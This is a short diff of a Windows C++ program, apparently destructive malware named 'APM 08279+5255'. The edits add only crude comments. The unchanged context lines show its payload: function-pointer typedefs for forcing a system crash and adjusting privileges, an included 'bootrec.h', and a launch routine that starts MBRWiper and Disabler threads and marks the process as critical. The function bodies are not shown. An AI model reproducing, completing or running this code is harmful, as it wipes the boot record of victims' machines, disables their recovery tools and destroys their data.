@@ -1,5 +1,5 @@
 ﻿// APM 08279+5255.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
-//
+// Fucked as hell error
 
 #include <windows.h>
 #include <tchar.h>
@@ -17,12 +17,12 @@
 #include <ctime>
 #include <string>
 #include "bootrec.h"
-#include "amogus.h" //yes I know I'm not funny
+#include "amogus.h" //yes I know I'm not funny, What the fuck? It is not even in the source.
 #define M_PI   3.14159265358979323846264338327950288
 //#define PI   3.14159265358979323846264338327950288
 typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
 typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
-typedef union _RGBQUAD {
+typedef union _RGBQUAD { // USE COLORPAL32 ISTG :sob:
 	COLORREF rgb;
 	struct {
 		BYTE b;
@@ -932,6 +932,7 @@ int CALLBACK WinMain(
 		}
 		else
 		{
+			// Fucked ChatGPT comments
 			CreateThread(0, 0, MBRWiper, 0, 0, 0);
 			CreateThread(0, 0, Disabler, 0, 0, 0);
 			ProcessIsCritical();
